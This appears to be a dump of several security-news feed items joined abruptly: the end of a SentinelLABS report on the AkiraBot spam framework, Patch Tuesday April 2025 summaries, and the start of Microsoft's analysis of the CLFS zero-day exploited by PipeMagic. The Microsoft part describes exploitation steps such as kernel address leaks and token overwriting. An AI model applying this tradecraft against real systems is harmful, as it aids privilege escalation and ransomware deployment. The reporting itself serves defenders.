&lt;figure class="wp-caption aligncenter" id="attachment_118102" style="width: 702px;"&gt;&lt;img alt="Telegram message submission + proxy rotation status in monitor.py" class="size-full wp-image-118102" height="564" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_22v2.jpg" width="702" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-118102"&gt;Telegram message submission + proxy rotation status in &lt;em&gt;monitor.py&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;All of the analyzed &lt;code&gt;monitor.py&lt;/code&gt; and &lt;code&gt;monitor_random.py&lt;/code&gt; scripts contain the same Telegram token and &lt;code&gt;chat_id&lt;/code&gt; combination.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_118103" style="width: 502px;"&gt;&lt;img alt=" Telegram bot data in monitor.py" class="size-full wp-image-118103" height="108" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_15v2.jpg" width="502" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-118103"&gt;Telegram bot data in &lt;em&gt;monitor.py&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;This Telegram &lt;code&gt;chat_id&lt;/code&gt; is associated with the following Telegram user data:&lt;/p&gt;
&lt;pre&gt;
(bot) username: htscasdasdadwoobot
Firstname: Shadow / hts
LastName: a_zarkawi
&lt;/pre&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117829" style="width: 511px;"&gt;&lt;img alt="HTS Telegram bot referenced in monitor.py scripts" class="size-full wp-image-117829" height="239" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_16.jpg" width="511" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117829"&gt;HTS Telegram bot referenced in monitor.py scripts&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Infrastructure&lt;/h2&gt;
&lt;p&gt;The spam messages frequently rotate the domain used, likely in an attempt to avoid detection. The oldest domain in use is &lt;code&gt;akirateam[.]com&lt;/code&gt;, which was registered in January 2022 on a Germany-based IP, &lt;code&gt;91.195.240[.]94&lt;/code&gt;, without further updates until March 2023. The second oldest domain is &lt;code&gt;goservicewrap[.]com&lt;/code&gt;, which was registered in April 2024 and resolved to &lt;code&gt;86.38.202[.]110&lt;/code&gt;, a Hostinger IP in Cyprus.&lt;/p&gt;
&lt;p&gt;Several AkiraBot domains have interesting connections through historical DNS activity. The subdomain &lt;code&gt;mail.servicewrap-go[.]com&lt;/code&gt; briefly shared a CNAME record pointing to &lt;code&gt;77980.bodis[.]com&lt;/code&gt;, which is associated with various malicious activities, including a 2023 malvertising &lt;a href="https://blog.sucuri.net/2023/07/malicious-injection-redirects-traffic-to-parked-domain.html" rel="noopener noreferrer" target="_blank"&gt;campaign&lt;/a&gt;. This domain also received communications from several Windows executable files that were detected as various banking trojans.&lt;/p&gt;
&lt;p&gt;An odd relationship stood out in anchor links referencing &lt;code&gt;77980.bodis[.]com&lt;/code&gt;: the website &lt;code&gt;unj[.]digital&lt;/code&gt; contained anchor links from December 2024 through February 2025 pointing to &lt;code&gt;77980.bodis[.]com&lt;/code&gt;. UNJ Digital&amp;#8217;s website describes itself as a digital marketing and software development firm. The subdomain &lt;code&gt;smtp.unj[.]digital&lt;/code&gt; also has a CNAME record pointing to &lt;code&gt;77980.bodis[.]com&lt;/code&gt;, fortifying a connection between these hosts. While the website now highlights offering digital content services, as of late 2024 the site showed a focus on increasing marketing revenue.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117815" style="width: 894px;"&gt;&lt;img alt="Screenshot of content on unj[.]digital circa October 2024" class="size-full wp-image-117815" height="672" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_9.jpg" width="894" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117815"&gt;Screenshot of content on &lt;em&gt;unj[.]digital&lt;/em&gt; circa October 2024&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117833" style="width: 894px;"&gt;&lt;img alt="Screenshot of content on unj[.]digital circa March 2025" class="size-full wp-image-117833" height="672" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_13.jpg" width="894" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117833"&gt;Screenshot of content on &lt;em&gt;unj[.]digital&lt;/em&gt; circa March 2025&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Akira and ServiceWrap SEO&lt;/h2&gt;
&lt;p&gt;AkiraBot uses two distinct themes in their SEO offering domain naming conventions: &lt;a href="https://www.trustpilot.com/review/useakira.com" rel="noopener noreferrer" target="_blank"&gt;Akira&lt;/a&gt; and &lt;a href="https://www.trustpilot.com/review/servicewrapgo.com" rel="noopener noreferrer" target="_blank"&gt;ServiceWrap&lt;/a&gt;. Reviews for both services on TrustPilot are similar: many 5-star reviews with similar, potentially AI-generated contents, and the occasional 1-star review complaining that the site is either a scam or has spammed the person leaving the review.&lt;/p&gt;
&lt;p&gt;The 5-star reviews tend to follow a pattern where the reviewer has one previous review that was made 1-5 days before the Akira or ServiceWrap review. The review themes are very similar across these 5-star reviews, though the contents and structure are always unique. We believe the actor may be generating some fake reviews, though it is difficult to say with certainty.&lt;/p&gt;
&lt;p&gt;&lt;figure class="wp-caption aligncenter" id="attachment_117816" style="width: 572px;"&gt;&lt;img alt="Trustpilot review for servicewrapgo[.]com" class="size-full wp-image-117816" height="275" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_8.jpg" width="572" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117816"&gt;Trustpilot review for &lt;em&gt;servicewrapgo[.]com&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117825" style="width: 572px;"&gt;&lt;img alt="Trustpilot review for useakira[.]com" class="size-full wp-image-117825" height="507" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_2.jpg" width="572" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117825"&gt;Trustpilot review for &lt;em&gt;useakira[.]com&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;br /&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117820" style="width: 572px;"&gt;&lt;img alt="Trustpilot review for useakira[.]com" class="size-full wp-image-117820" height="455" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_3.jpg" width="572" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117820"&gt;Trustpilot review for useakira[.]com&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;AkiraBot is a sprawling framework that has undergone multiple iterations to integrate new spamming target technologies and evade website defenses. We expect this campaign to continue to evolve as website hosting providers adapt defenses to deter spam. The author or authors have invested significant effort in this bot’s ability to bypass commonly used CAPTCHA technologies, which demonstrates that the operators are motivated to violate service provider protections.&lt;/p&gt;
&lt;p&gt;AkiraBot’s use of LLM-generated spam message content demonstrates the emerging challenges that AI poses to defending websites against spam attacks. The easiest indicators to block are the rotating set of domains used to sell the Akira and ServiceWrap SEO offerings, as there is no longer a consistent approach in the spam message contents as there were with previous campaigns selling the services of these firms.&lt;/p&gt;
&lt;p&gt;SentinelLABS thanks the OpenAI security team for their collaboration and continued efforts in deterring bad actors from abusing their services. The OpenAI team shared the following response following their investigation:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;“We&amp;#8217;re grateful to SentinelOne for sharing their research. Distributing output from our services for spam is against our policies. The API key involved is disabled, and we’re continuing to investigate and will disable any associated assets. We take misuse seriously and are continually improving our systems to detect abuse.”&lt;/em&gt;&lt;/p&gt;

&lt;/ul&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice.

Eleven of those flaws earned Microsoft's most-dire "critical" rating, meaning malware or malcontents could exploit them with little to no interaction from Windows users.</description><content:encoded>&lt;p&gt;&lt;strong&gt;Microsoft&lt;/strong&gt; today released updates to plug at least 121 security holes in its &lt;strong&gt;Windows&lt;/strong&gt; operating systems and software, including one vulnerability that is already being exploited in the wild. Eleven of those flaws earned Microsoft&amp;#8217;s most-dire &amp;#8220;critical&amp;#8221; rating, meaning malware or malcontents could exploit them with little to no interaction from Windows users.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" class="aligncenter  wp-image-56287" height="528" src="https://krebsonsecurity.com/wp-content/uploads/2021/07/windupate.png" width="750" /&gt;&lt;/p&gt;
&lt;p&gt;The zero-day flaw already seeing exploitation is &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-29824" rel="noopener" target="_blank"&gt;CVE-2025-29824&lt;/a&gt;, a local elevation of privilege bug in the Windows &lt;strong&gt;Common Log File System&lt;/strong&gt; (CLFS) driver.  Microsoft rates it as &amp;#8220;important,&amp;#8221; but as &lt;strong&gt;Chris Goettl&lt;/strong&gt; from &lt;strong&gt;Ivanti&lt;/strong&gt; points out, risk-based prioritization warrants treating it as critical.&lt;/p&gt;
&lt;p&gt;This CLFS component of Windows is no stranger to Patch Tuesday: According to Tenable&amp;#8217;s &lt;strong&gt;Satnam Narang&lt;/strong&gt;, since 2022 Microsoft has patched 32 CLFS vulnerabilities &amp;#8212; averaging 10 per year &amp;#8212; with six of them exploited in the wild. The &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2024-49138" rel="noopener" target="_blank"&gt;last CLFS zero-day&lt;/a&gt; was &lt;a href="https://krebsonsecurity.com/2024/12/patch-tuesday-december-2024-edition/" rel="noopener" target="_blank"&gt;patched in December 2024&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Narang notes that while flaws allowing attackers to install arbitrary code are consistently top overall Patch Tuesday features, the data is reversed for zero-day exploitation.&lt;/p&gt;
&lt;p&gt;&amp;#8220;For the past two years, elevation of privilege flaws have led the pack and, so far in 2025, account for over half of all zero-days exploited,&amp;#8221; Narang wrote.&lt;span id="more-70933"&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Rapid7&amp;#8217;s &lt;strong&gt;Adam Barnett&lt;/strong&gt; warns that any Windows defenders responsible for an &lt;a href="https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol" rel="noopener" target="_blank"&gt;LDAP server&lt;/a&gt; — which means almost any organization with a non-trivial Microsoft footprint — should add &lt;span class="il"&gt;patching&lt;/span&gt; for the critical flaw &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-26663" rel="noopener" target="_blank"&gt;CVE-2025-26663&lt;/a&gt; to their to-do list.&lt;/p&gt;
&lt;p&gt;&amp;#8220;With no privileges required, no need for user interaction, and code execution presumably in the context of the LDAP server itself, successful exploitation would be an attractive shortcut to any attacker,&amp;#8221; Barnett said. &amp;#8220;Anyone wondering if today is a re-run of December 2024 &lt;span class="il"&gt;Patch&lt;/span&gt; &lt;span class="il"&gt;Tuesday&lt;/span&gt; can take some small solace in the fact that the worst of the &lt;a href="https://www.rapid7.com/blog/post/2024/12/10/patch-tuesday-december-2024/#ldap-critical-rce" rel="noopener" target="_blank"&gt;trio of LDAP critical RCEs published at the end of last year&lt;/a&gt; was likely easier to exploit than today’s example, since today’s CVE-2025-26663 requires that an attacker win a race condition. Despite that, Microsoft still expects that exploitation is more likely.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Among the critical updates Microsoft patched this month are remote code execution flaws in &lt;strong&gt;Windows Remote Desktop &lt;/strong&gt;services (RDP), including &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-26671" rel="noopener" target="_blank"&gt;CVE-2025-26671&lt;/a&gt;, &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-27480" rel="noopener" target="_blank"&gt;CVE-2025-27480&lt;/a&gt; and &lt;a href="https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2025-27482" rel="noopener" target="_blank"&gt;CVE-2025-27482&lt;/a&gt;; only the latter two are rated &amp;#8220;critical,&amp;#8221; and Microsoft marked both of them as “Exploitation More Likely.&amp;#8221;&lt;/p&gt;
&lt;p&gt;Perhaps the most widespread vulnerabilities fixed this month were in web browsers. &lt;strong&gt;Google Chrome&lt;/strong&gt; &lt;a href="https://chromereleases.googleblog.com/" rel="noopener" target="_blank"&gt;updated&lt;/a&gt; to fix 13 flaws this week, and &lt;strong&gt;Mozilla Firefox &lt;/strong&gt;fixed &lt;a href="https://www.mozilla.org/en-US/security/advisories/mfsa2025-20/" rel="noopener" target="_blank"&gt;eight bugs&lt;/a&gt;, with possibly more updates coming later this week for &lt;strong&gt;Microsoft&lt;/strong&gt; &lt;strong&gt;Edge&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;As it tends to do on Patch Tuesdays, &lt;strong&gt;Adobe&lt;/strong&gt; has &lt;a href="https://helpx.adobe.com/security/security-bulletin.html" rel="noopener" target="_blank"&gt;released 12 updates&lt;/a&gt; resolving 54 security holes across a range of products, including &lt;strong&gt;ColdFusion&lt;/strong&gt;, &lt;strong&gt;Adobe Commerce&lt;/strong&gt;, &lt;strong&gt;Experience Manager Forms&lt;/strong&gt;, &lt;strong&gt;After Effects&lt;/strong&gt;, &lt;strong&gt;Media Encoder&lt;/strong&gt;, &lt;strong&gt;Bridge&lt;/strong&gt;, &lt;strong&gt;Premiere Pro&lt;/strong&gt;, &lt;strong&gt;Photoshop&lt;/strong&gt;, &lt;strong&gt;Animate&lt;/strong&gt;, &lt;strong&gt;AEM Screens&lt;/strong&gt;, and &lt;strong&gt;FrameMaker&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Apple&lt;/strong&gt; users may need to patch as well. On March 31, Apple released a huge security update (more than three gigabytes in size) to fix issues in a range of their products, including &lt;a href="https://www.bleepingcomputer.com/news/security/apple-backports-zero-day-patches-to-older-iphones-and-macs/" rel="noopener" target="_blank"&gt;at least one zero-day flaw&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;And in case you missed it, on March 31, 2025 &lt;strong&gt;Apple&lt;/strong&gt; released &lt;a href="https://support.apple.com/en-us/100100?is=1ef7934f6635b02395adcab09a0c1b24bf0ea745b648bfe87189de8aadc7300b" rel="noopener" target="_blank"&gt;a rather large batch of security updates&lt;/a&gt; for a wide range of their products, from &lt;strong&gt;macOS&lt;/strong&gt; to the&lt;strong&gt; iOS&lt;/strong&gt; operating systems on &lt;strong&gt;iPhones&lt;/strong&gt; and &lt;strong&gt;iPads&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Earlier today, Microsoft included a note saying &lt;strong&gt;Windows 10&lt;/strong&gt; security updates weren&amp;#8217;t available but would be released as soon as possible. It appears from browsing &lt;a href="https://www.askwoody.com/2025/april-2025-updates-out/" rel="noopener" target="_blank"&gt;askwoody.com&lt;/a&gt; that this snafu has since been rectified. Either way, if you run into complications applying any of these updates please leave a note about it in the comments below, because the chances are good that someone else had the same problem.&lt;/p&gt;
&lt;p&gt;As ever, please consider backing up your data and or devices prior to updating, which makes it far less complicated to undo a software update gone awry.

Here&amp;#8217;s a quick breakdown of what you need to know.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="microsoft-patch-tuesday-for-april-2025"&gt;Microsoft Patch Tuesday for April 2025&lt;/h2&gt;



&lt;p&gt;In this month&amp;#8217;s Patch Tuesday, April 2025 edition, Microsoft addressed &lt;strong&gt;134&lt;/strong&gt; vulnerabilities, including &lt;strong&gt;11&lt;/strong&gt; critical and &lt;strong&gt;110&lt;/strong&gt; important severity vulnerabilities. In this month&amp;#8217;s updates, Microsoft has addressed &lt;strong&gt;one&lt;/strong&gt; zero-day vulnerability being exploited in the wild.&lt;/p&gt;



&lt;p&gt;Microsoft has addressed &lt;strong&gt;12&lt;/strong&gt; vulnerabilities in Microsoft Edge (Chromium-based) in this month&amp;#8217;s updates.&lt;/p&gt;



&lt;p&gt;Microsoft Patch Tuesday, April edition includes updates for vulnerabilities in Windows Hyper-V, Remote Desktop Gateway Service, Windows Routing and Remote Access Service (RRAS), Windows Common Log File System Driver, Windows TCP/IP, Visual Studio, Windows Active Directory Certificate Services, Windows Kerberos, Windows Kernel,&amp;nbsp;and more.&lt;/p&gt;



&lt;p&gt;Microsoft has fixed several flaws in multiple software, including Spoofing, Denial of Service (DoS), Elevation of Privilege (EoP), Information Disclosure, and Remote Code Execution (RCE).&lt;/p&gt;



&lt;span id="more-37553"&gt;&lt;/span&gt;



&lt;p&gt;The April 2025 Microsoft vulnerabilities are classified as follows:&lt;/p&gt;



&lt;figure class="wp-block-table is-style-stripes"&gt;&lt;table class="has-fixed-layout"&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;Vulnerability Category&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Quantity&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;&lt;strong&gt;Severities&lt;/strong&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Spoofing Vulnerability&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;Important: 1&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Denial of Service Vulnerability&lt;/td&gt;&lt;td&gt;14&lt;/td&gt;&lt;td&gt;Important: 14&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Elevation of Privilege Vulnerability&lt;/td&gt;&lt;td&gt;49&lt;/td&gt;&lt;td&gt;Important: 49&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Information Disclosure Vulnerability&lt;/td&gt;&lt;td&gt;17&lt;/td&gt;&lt;td&gt;Important: 17&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Remote Code Execution Vulnerability&lt;/td&gt;&lt;td&gt;31&lt;/td&gt;&lt;td&gt;Critical: 20&lt;br /&gt;Important: 11&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Security Feature Bypass Vulnerability&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;Important: 9&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="adobe-patches-for-april-2025"&gt;Adobe Patches for April 2025&lt;/h2&gt;



&lt;p&gt;Adobe has released &lt;strong&gt;10&lt;/strong&gt; security advisories to address &lt;strong&gt;47&lt;/strong&gt; vulnerabilities in Adobe ColdFusion, Adobe XMP Toolkit SDK, Adobe FrameMaker, Adobe Experience Manager Screens, Adobe Animate, Adobe Photoshop, Adobe Premiere Pro, Adobe Experience Manager Forms, Adobe Bridge, and Adobe After Effects. &lt;strong&gt;24&lt;/strong&gt;&amp;nbsp;of these vulnerabilities are given critical severity ratings. Successful exploitation of these vulnerabilities may lead to&amp;nbsp;Arbitrary file system read, Security feature bypass, and&amp;nbsp;arbitrary code execution.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="zero-day-vulnerabilities-patched-in-april-patch-tuesday-edition"&gt;Zero-day Vulnerabilities Patched in April Patch Tuesday Edition&lt;/h2&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-29824" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-29824: Windows Common Log File System Driver Elevation of Privilege Vulnerability&lt;/a&gt;&lt;/h3&gt;



&lt;p&gt;The Common Log File System (CLFS) is a general-purpose logging service used by software clients running in user or kernel mode. CLFS can be used for data management, database systems, messaging, Online Transactional Processing (OLTP), and other transactional systems.&lt;/p&gt;



&lt;p&gt;The use after free flaw in the Windows Common Log File System Driver could allow an authenticated attacker to elevate privileges locally. Upon successful exploitation, an attacker may gain SYSTEM privileges.&lt;/p&gt;



&lt;p&gt;CISA added the CVE-2025-29824 to its &lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" rel="noreferrer noopener" target="_blank"&gt;Known Exploited Vulnerabilities Catalog&lt;/a&gt;, acknowledging its active exploitation. CISA urges users to patch the vulnerability before April 29, 2025.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="critical-severity-vulnerabilities-patched-in-april-patch-tuesday-edition"&gt;Critical Severity Vulnerabilities Patched in April Patch Tuesday Edition&lt;/h2&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-26686" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-26686: Windows TCP/IP Remote Code Execution Vulnerability&lt;/a&gt;&lt;/h3&gt;



&lt;p&gt;TCP/IP stands for Transmission Control Protocol/Internet Protocol and is a suite of communication protocols used to interconnect network devices on the Internet. TCP/IP is also used as a communications protocol in a private computer network &amp;#8212; an intranet or extranet.&lt;/p&gt;



&lt;p&gt;An attacker must win a race condition to exploit the vulnerability. Sensitive data storage in improperly locked memory in Windows TCP/IP allows an unauthorized attacker to execute code over a network.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-27752" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-27752: Microsoft Excel Remote Code Execution Vulnerability&lt;/a&gt;&lt;/h3&gt;



&lt;p&gt;The heap-based buffer overflow flaw in Microsoft Office Excel could allow an unauthenticated attacker to achieve remote code execution.&amp;nbsp;&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-29791" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-29791: Microsoft Excel Remote Code Execution Vulnerability&lt;/a&gt;&lt;/h3&gt;



&lt;p&gt;The type confusion in Microsoft Office Excel could allow an unauthenticated attacker to achieve remote code execution.&lt;/p&gt;



&lt;h3 class="wp-block-heading"&gt;&lt;a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-27491" rel="noreferrer noopener" target="_blank"&gt;CVE-2025-27491: Windows Hyper-V Remote Code Execution Vulnerability&lt;/a&gt;&lt;/h3&gt;



&lt;p&gt;Hyper-V is Microsoft&amp;#8217;s hardware virtualization product that allows users&amp;nbsp;to create and run virtual machines (VMs) on Windows Server and Windows 10/11. The product enables better hardware utilization and resource management.&lt;/p&gt;



&lt;p&gt;An attacker must win a race condition to exploit the vulnerability. The use after free flaw in&amp;nbsp;Windows Hyper-V&amp;nbsp;could allow an authenticated attacker to achieve remote code execution.&lt;/p&gt;

&lt;p&gt;With Qualys Policy Compliance’s Out-of-the-Box Mitigation or Compensatory Controls reduce the risk of a vulnerability being exploited because the remediation (fix/patch) cannot be done now, these security controls are not recommended by any industry standards such as CIS, DISA-STIG.&lt;/p&gt;



&lt;p&gt;Qualys Policy Compliance team releases these exclusive controls based on Vendor-suggested Mitigation/Workaround.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;&lt;em&gt;Mitigation&lt;/em&gt;&lt;/strong&gt; refers to a setting, common configuration, or general best practice, existing in a default state, that could reduce the severity of exploitation of a vulnerability.&lt;/p&gt;



&lt;p&gt;A &lt;strong&gt;&lt;em&gt;workaround&lt;/em&gt;&lt;/strong&gt; is a method, sometimes used temporarily, for achieving a task or goal when the usual or planned method isn’t working. Information technology often uses a workaround to overcome hardware, programming, or communication problems. Once a problem is fixed, a workaround is usually abandoned.&lt;/p&gt;

Microsoft released security updates to address the vulnerability, tracked as CVE 2025-29824, on April 8, 2025. &lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/04/08/exploitation-of-clfs-zero-day-leads-to-ransomware-activity/"&gt;Exploitation of CLFS zero-day leads to ransomware activity&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Microsoft Threat Intelligence Center (MSTIC) and Microsoft Security Response Center (MSRC) have discovered post-compromise exploitation of a zero-day elevation of privilege vulnerability in the Windows Common Log File System (CLFS) against a small number of targets. The targets include organizations in the information technology (IT) and real estate sectors of the United States, the financial sector in Venezuela, a Spanish software company, and the retail sector in Saudi Arabia. Microsoft released security updates to address the vulnerability, tracked as &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-29824"&gt;CVE-2025-29824&lt;/a&gt;, on April 8, 2025.&lt;/p&gt;



&lt;p&gt;In addition to discovering the vulnerability, Microsoft also found that the exploit has been deployed by PipeMagic malware. Microsoft is attributing the exploitation activity to Storm-2460, which also used PipeMagic to deploy ransomware. Ransomware threat actors value post-compromise elevation of privilege exploits because these could enable them to escalate initial access, including handoffs from commodity malware distributors, into privileged access. They then use privileged access for widespread deployment and detonation of ransomware within an environment. Microsoft highly recommends that organizations prioritize applying security updates for elevation of privilege vulnerabilities to add a layer of defense against ransomware attacks if threat actors are able to gain an initial foothold.&lt;/p&gt;



&lt;p&gt;This blog details Microsoft’s analysis of the observed CLFS exploit and related activity targeting our customers. This information is shared with our customers and industry partners to improve detection of these attacks and encourage rapid patching or other mitigations, as appropriate. A more comprehensive recommendations section, with indicators of compromise and detection details can be found at the end of the blog post.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="cve-2025-29824-a-zero-day-vulnerability-in-the-common-log-file-system-clfs"&gt;CVE 2025-29824: A zero-day vulnerability in the Common Log File System (CLFS)&lt;/h2&gt;



&lt;p&gt;The exploit activity discovered by Microsoft targets a zero-day vulnerability in the Common Log File System (CLFS) kernel driver. Successful exploitation allows an attacker running as a standard user account to escalate privileges. The vulnerability is tracked as &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-29824"&gt;CVE-2025-29824&lt;/a&gt; and was fixed on April 8, 2025.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="pre-exploitation-activity"&gt;Pre-exploitation activity&lt;/h3&gt;



&lt;p&gt;While Microsoft hasn&amp;#8217;t determined the initial access vectors that led to the devices being compromised, there are some notable pre-exploitation behaviors by Storm-2460. In multiple cases, the threat actor used the certutil utility to download a file from a legitimate third-party website that was previously compromised to host the threat actor’s malware.&lt;/p&gt;



&lt;p&gt;The downloaded file was a malicious MSBuild file, a technique described &lt;a href="https://blog.talosintelligence.com/building-bypass-with-msbuild/"&gt;here&lt;/a&gt;, that carried an encrypted malware payload. Once the payload was decrypted and executed via the &lt;em&gt;EnumCalendarInfoA&lt;/em&gt; API callback, the malware was found to be &lt;a href="https://www.kaspersky.com/about/press-releases/kaspersky-uncovers-pipemagic-backdoor-attacks-businesses-through-fake-chatgpt-application"&gt;PipeMagic,&lt;/a&gt; which Kaspersky documented in October 2024&lt;em&gt;. &lt;/em&gt;Researchers at &lt;a href="https://x.com/ESETresearch/status/1899508656258875756"&gt;ESET have also observed&lt;/a&gt; the use of PipeMagic in 2023 in connection with the deployment of a zero-day exploit for a Win32k vulnerability assigned &lt;a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-24983"&gt;CVE-2025-24983&lt;/a&gt;. A domain used by the PipeMagic sample was &lt;em&gt;aaaaabbbbbbb.eastus.cloudapp.azure[.]com, &lt;/em&gt;which has now been disabled by Microsoft.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="clfs-exploit-activity"&gt;CLFS exploit activity&lt;/h3&gt;



&lt;p&gt;Following PipeMagic deployment, the attackers launched the CLFS exploit in memory from a &lt;em&gt;dllhost.exe &lt;/em&gt;process.&lt;/p&gt;



&lt;p&gt;The exploit targets a vulnerability in the CLFS kernel driver. It’s notable that the exploit first uses the &lt;em&gt;NtQuerySystemInformation &lt;/em&gt;API to leak kernel addresses to user mode. However, beginning in Windows 11, version 24H2, access to certain System Information Classes within &lt;em&gt;NtQuerySystemInformation &lt;/em&gt;became available only to users with &lt;em&gt;SeDebugPrivilege&lt;/em&gt;, which typically only admin-like users can obtain. This meant that the exploit did not work on Windows 11, version 24H2, even if the vulnerability was present.&lt;/p&gt;



&lt;p&gt;The exploit then utilizes a memory corruption and the &lt;em&gt;RtlSetAllBits &lt;/em&gt;API to overwrite the exploit process’s token with the value 0xFFFFFFFF, enabling all privileges for the process, which allows for process injection into SYSTEM processes.&lt;/p&gt;



